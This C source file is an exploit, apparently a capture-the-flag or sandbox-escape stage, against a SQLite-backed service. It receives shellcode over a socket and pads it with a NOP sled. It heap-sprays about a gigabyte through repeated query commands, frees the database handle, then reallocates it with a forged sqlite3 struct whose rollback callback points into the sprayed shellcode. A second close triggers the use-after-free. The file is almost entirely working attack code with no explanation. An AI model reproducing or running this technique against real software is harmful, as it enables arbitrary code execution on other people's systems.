enum {
    PREP_QUERY = 1,
    CLOSE_DB = 4
};

#define SOCKFD 4
#define MASTER_OUTFD 7
#define MASTER_INFD 3

typedef unsigned long long u64;
typedef long long i64;
typedef unsigned short u16;
typedef unsigned char u8;
typedef unsigned int u32;

struct sqlite3InitInfo {
    int newTnum;
    u8 iDb;
    u8 busy;
    u8 orphanTrigger;
};

typedef struct Lookaside {
    u16 sz;
    u8 bEnabled;
    u8 bMalloced;
    int nOut;
    int mxOut;
    int anStat[3];
    void *pFree;
    void *pStart;
    void *pEnd;
} Lookaside;

typedef struct Hash {
    unsigned int htsize;
    unsigned int count;
    void *first;
    struct _ht *ht;
} Hash;

typedef struct FuncDefHash {
    void *a[23];
} FuncDefHash;

typedef struct BusyHandler {
    int (*xFunc)(void *, int);
    void *pArg;
    int nBusy;
} BusyHandler;

typedef struct Db {
    char *zName;
    void *pBt;
    u8 safety_level;
    void *pSchema;
} Db;

struct sqlite3;
typedef struct sqlite3 sqlite3;

struct sqlite3 {
    void *pVfs;
    void *pVdbe;
    void *pDfltColl;
    void *mutex;
    void *aDb;
    int nDb;
    int flags;
    i64 lastRowid;
    i64 szMmap;
    unsigned int openFlags;
    int errCode;
    int errMask;
    u16 dbOptFlags;
    u8 autoCommit;
    u8 temp_store;
    u8 mallocFailed;
    u8 dfltLockMode;
    signed char nextAutovac;
    u8 suppressErr;
    u8 vtabOnConflict;
    u8 isTransactionSavepoint;
    int nextPagesize;
    u32 magic;
    int nChange;
    int nTotalChange;
    int aLimit[11];
    struct sqlite3InitInfo init;
    int nVdbeActive;
    int nVdbeRead;
    int nVdbeWrite;
    int nVdbeExec;
    int nExtension;
    void **aExtension;
    void (*xTrace)(void *, const char *);
    void *pTraceArg;
    void (*xProfile)(void *, const char *, u64);
    void *pProfileArg;
    void *pCommitArg;
    int (*xCommitCallback)(void *);
    void *pRollbackArg;
    void (*xRollbackCallback)(void *);
    void *pUpdateArg;
    void (*xUpdateCallback)(void *, int, const char *, const char *, i64);
    int (*xWalCallback)(void *, sqlite3 *, const char *, int);
    void *pWalArg;
    void (*xCollNeeded)(void *, sqlite3 *, int, const char *);
    void (*xCollNeeded16)(void *, sqlite3 *, int, const void *);
    void *pCollNeededArg;
    void *pErr;
    union {
        volatile int isInterrupted;
        double notUsed1;
    } u1;
    Lookaside lookaside;
    int (*xAuth)(void *, int, const char *, const char *, const char *, const char *);
    void *pAuthArg;
    int (*xProgress)(void *);
    void *pProgressArg;
    unsigned int nProgressOps;
    int nVTrans;
    Hash aModule;
    void *pVtabCtx;
    void **aVTrans;
    void *pDisconnect;
    FuncDefHash aFunc;
    Hash aCollSeq;
    BusyHandler busyHandler;
    Db aDbStatic[2];
    void *pSavepoint;
    int busyTimeout;
    int nSavepoint;
    int nStatement;
    i64 nDeferredCons;
    i64 nDeferredImmCons;
    int *pnBytesFreed;
    sqlite3 *pBlockingConnection;
    sqlite3 *pUnlockConnection;
    void *pUnlockArg;
    void (*xUnlockNotify)(void **, int);
    sqlite3 *pNextBlocked;
};

void sendcmd(int f, int arg) {
    struct { int f; int arg; } cmd;
    cmd.f = f;
    cmd.arg = arg;
    sys_write(MASTER_OUTFD, &cmd, sizeof(cmd));
}

void *memset(void *s, int c, size_t n) {
    unsigned char* p=s;
    while(n--)
        *p++ = (unsigned char)c;
    return s;
}

int main() {
    unsigned int res;
    struct sqlite3 s;
    char dummy[8];

    //recv shellcode
    char sc[1024 * 1024];
    memset(sc, 0x90, sizeof(sc));
    int sclen;
    sys_read(SOCKFD, &sclen, 4);
    sys_read(SOCKFD, sc + (sizeof(sc) - sclen), sclen);

    //heap spray
    int j;
    for (j = 0; j < 1024; j++) {
        sendcmd(PREP_QUERY, 1024 * 1024);
        sys_write(MASTER_OUTFD, &sc, sizeof(sc));
        sys_read(MASTER_INFD, &res, 4);
    }

    //close db
    sendcmd(CLOSE_DB, 0);
    sys_read(MASTER_INFD, &res, 4);
    sys_write(SOCKFD, &res, 4);
    res = 0;

    //overwrite struct sqlite3
    //the buffer is allocated at db - 8
    memset(dummy, 0, sizeof(dummy));
    memset(&s, 0, sizeof(s));
    s.magic = 0xa029a697;
    /*s.xTrace = 0x41414141;
    s.xProfile = 0x41414141;
    s.xCommitCallback = 0x41414141;*/
    s.xRollbackCallback = 0xc0000000; //shellcode
    /*s.xUpdateCallback = 0x41414141;
    s.xCollNeeded = 0x41414141;
    s.xCollNeeded16 = 0x41414141;
    s.xAuth = 0x41414141;
    s.xProgress = 0x41414141;
    s.busyHandler.xFunc = 0x41414141;
    s.xUnlockNotify = 0x41414141;*/

    sendcmd(PREP_QUERY, sizeof(s) + 8);
    sys_write(MASTER_OUTFD, dummy, 8);
    sys_write(MASTER_OUTFD, &s, sizeof(s));

    sys_read(MASTER_INFD, &res, 4);
    sys_write(SOCKFD, &res, 4);
    res = 0;

    //use-after-free
    sendcmd(CLOSE_DB, 0);

    sys__exit(0);
}

